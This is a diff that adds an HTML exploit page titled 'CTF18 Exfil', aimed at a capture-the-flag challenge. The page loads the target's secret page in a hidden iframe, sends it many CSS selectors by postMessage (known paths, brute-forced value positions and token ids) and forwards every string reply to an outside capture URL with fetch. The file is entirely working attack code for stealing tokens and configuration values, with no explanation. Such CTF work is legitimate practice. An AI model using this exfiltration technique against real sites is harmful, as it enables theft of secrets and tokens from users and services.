@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<meta charset="utf-8">
+<title>CTF18 Exfil</title>
+<body>
+<script>
+// Replace with your capture URL, e.g. https://webhook.site/<uuid>
+const EXFIL_URL = 'https://example.com/capture?d=';
+
+function exfil(data) {
+  try {
+    fetch(EXFIL_URL + encodeURIComponent(data), {mode: 'no-cors'});
+  } catch (_) {}
+}
+
+window.addEventListener('message', (e) => {
+  if (typeof e.data === 'string' && e.data.trim()) {
+    exfil(e.data);
+  }
+});
+
+const frame = document.createElement('iframe');
+frame.src = 'https://web-post-mess-web.purple.ctfcompetition.com/secret';
+frame.style.display = 'none';
+document.body.appendChild(frame);
+
+function send(sel) {
+  try { frame.contentWindow.postMessage(sel, '*'); } catch (_) {}
+}
+
+function run() {
+  // Known selectors
+  [
+    'server-settings > document-root',
+    'server-settings > server-admin',
+    'logging > log-level',
+    'logging > log-directory',
+    '#token1 > value',
+    '#token2 > value'
+  ].forEach(send);
+
+  // Brute force <value> positions
+  for (let i = 1; i <= 64; i++) {
+    send(`value:nth-of-type(${i})`);
+  }
+
+  // Try tokens by id pattern
+  for (let i = 1; i <= 32; i++) {
+    send(`#token${i} > value`);
+  }
+
+  // Try some common tag paths
+  [
+    'web-server-config > server-settings > server-tokens',
+    'web-server-config > server-settings',
+    'web-server-config > logging'
+  ].forEach(send);
+}
+
+setTimeout(run, 600);
+</script>
+</body>
+</html>
+
+
